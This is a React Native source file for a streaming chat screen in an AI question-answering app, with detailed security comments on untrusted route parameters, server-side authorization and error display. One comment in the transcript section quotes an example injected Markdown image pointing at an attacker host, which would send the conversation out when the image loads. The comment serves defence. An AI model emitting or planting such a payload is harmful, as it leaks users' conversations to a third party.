import { Redirect, Stack, useLocalSearchParams } from 'expo-router';
import { useCallback, useState } from 'react';
import type { ReactNode } from 'react';
import { ScrollView, StyleSheet, Text, TextInput, TouchableOpacity, View } from 'react-native';

import { useAnswerStream, type AnswerStreamStatus } from '@/features/chat/use-answer-stream';
import { firstParam, isUlid } from '@/lib/safe-href';

/** The statuses with a socket still open. Everything else is a finished turn. */
const STREAMING_STATUSES: ReadonlySet<AnswerStreamStatus> = new Set<AnswerStreamStatus>([
  'sending',
  'retrieving',
  'reranking',
  'generating',
]);

/**
 * The streaming chat surface.
 *
 * THE ROUTE PARAMETER IS UNTRUSTED. This screen is reachable from a verified Universal Link, and a
 * verified link proves the DOMAIN — that the URL came from a page on a host we control — not that
 * the person holding the device is entitled to the conversation named in it. Two consequences:
 *
 *  1. Validate the shape locally, first. `useLocalSearchParams` types a parameter as
 *     `string | string[]` because a duplicated query key produces an array, and a screen that
 *     reads it as a string will happily interpolate `a,b` into a URL. A malformed id becomes a
 *     local not-found and never reaches the network.
 *  2. The SERVER is the authority. Laravel re-resolves the conversation against this device's own
 *     token and returns the public 404 for anything the caller does not own — never a 403, which
 *     on a foreign identifier confirms the row exists and turns this screen into an enumeration
 *     oracle. This screen renders whatever that answer says; it does not decide.
 *
 * The link may never carry an organization id, an API origin, or a credential, and there is no
 * code path here that would read one.
 */
export default function ChatScreen(): ReactNode {
  const params = useLocalSearchParams<{ conversationId?: string | string[] }>();
  const conversationId = firstParam(params.conversationId);

  const { state, start, stop } = useAnswerStream();
  const [draft, setDraft] = useState('');

  const onSend = useCallback(async (): Promise<void> => {
    if (conversationId === undefined) return;
    // `client_message_id` is a stable per-message UUID minted HERE and reused across a retry of the
    // same message, so Laravel's idempotency key collapses a double tap or a remount into one
    // conversation, one provider call, one bill. A per-render id defeats the whole mechanism.
    const clientMessageId = globalThis.crypto.randomUUID();
    // `content`, not `text`. `text` is the token EVENT's field; posting it 422s every send on this
    // client and no other, and the shared suite stays green because each client's fixtures were
    // written from the same source of truth the client was.
    await start(conversationId, { client_message_id: clientMessageId, content: draft });
    // The draft is cleared only after the send is accepted. On a 401 the session provider purges
    // and routes to login while this component's state — including the draft — is preserved in
    // memory and restored afterwards.
    setDraft('');
  }, [conversationId, draft, start]);

  if (!isUlid(conversationId)) {
    return <Redirect href="/+not-found" />;
  }

  // An ALLOW-LIST of the in-flight statuses, not a deny-list of the finished ones. Written the
  // other way round — `!== 'idle' && !== 'done' && !== 'error'` — every status added later defaults
  // to "still streaming", so 'cancelled' and 'offline' both leave a Stop button on screen for a
  // stream that has already ended and a Send button the user cannot reach.
  const streaming = STREAMING_STATUSES.has(state.status);

  return (
    <View style={styles.container}>
      <Stack.Screen options={{ title: 'Chat' }} />

      <ScrollView style={styles.transcript}>
        {/* Model output is untrusted content and is rendered as PLAIN TEXT here. When Markdown
            rendering is added it goes through the sanitizer pipeline; a React Native <Text> tree
            has no innerHTML, which is what makes plain text safe by construction today. Remote
            images are never auto-loaded — an injected `![](https://attacker/?d=…)` in source text
            exfiltrates the conversation with no click. */}
        {state.citations.length > 0 && (
          <Text style={styles.citations}>{state.citations.length} sources</Text>
        )}
        <Text style={styles.answer}>{state.text}</Text>
        {state.status === 'retrieving' && <Text style={styles.status}>Searching sources…</Text>}
        {state.status === 'reranking' && <Text style={styles.status}>Ranking evidence…</Text>}
        {/* OFFLINE IS ITS OWN SENTENCE, with its own remedy. The request never reached a server, so
            there is no request_id to quote and nothing went wrong on our side; telling the user
            "something went wrong" here trains them to retry into a dead radio. Whatever text had
            already arrived is still rendered above — it was paid for. */}
        {state.status === 'offline' && (
          <Text style={styles.status}>
            You are offline. This will send when the connection comes back.
          </Text>
        )}
        {state.error !== null && (
          <Text style={styles.error}>
            {/* Class-mapped copy plus request_id. The envelope's `message` is operator-facing and
                can carry an internal hostname or raw upstream provider text — log it, never render
                it. `stream_lost` gets its own sentence and a Retry that re-reads the persisted
                message first; it never re-POSTs the same client_message_id. */}
            Something went wrong.
            {state.error.request_id !== null ? ` Reference: ${state.error.request_id}` : ''}
          </Text>
        )}
      </ScrollView>

      <View style={styles.composer}>
        {/* The composer is its own subtree so a transcript render cannot re-render its input —
            one setState per token over a growing transcript is what makes it drop keystrokes. */}
        <TextInput
          style={styles.input}
          value={draft}
          onChangeText={setDraft}
          placeholder="Ask a question"
          multiline
        />
        {streaming ? (
          // CANCEL SOURCE 1 of 3. The other two — navigating away and the app leaving the
          // foreground — are wired inside useAnswerStream and use the same controller.
          <TouchableOpacity style={styles.button} onPress={stop}>
            <Text style={styles.buttonLabel}>Stop</Text>
          </TouchableOpacity>
        ) : (
          <TouchableOpacity
            style={[styles.button, draft.trim() === '' && styles.buttonDisabled]}
            disabled={draft.trim() === ''}
            onPress={() => {
              void onSend();
            }}
          >
            <Text style={styles.buttonLabel}>Send</Text>
          </TouchableOpacity>
        )}
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  answer: { fontSize: 16, lineHeight: 24 },
  button: { backgroundColor: '#0F172A', borderRadius: 8, justifyContent: 'center', padding: 12 },
  buttonDisabled: { opacity: 0.5 },
  buttonLabel: { color: '#F8FAFC', fontWeight: '600' },
  citations: { color: '#64748B', marginBottom: 8 },
  composer: {
    borderTopColor: '#E2E8F0',
    borderTopWidth: 1,
    flexDirection: 'row',
    gap: 8,
    padding: 12,
  },
  container: { flex: 1 },
  error: { color: '#B91C1C', marginTop: 12 },
  input: { borderColor: '#CBD5E1', borderRadius: 8, borderWidth: 1, flex: 1, padding: 12 },
  status: { color: '#64748B', marginTop: 8 },
  transcript: { flex: 1, padding: 16 },
});
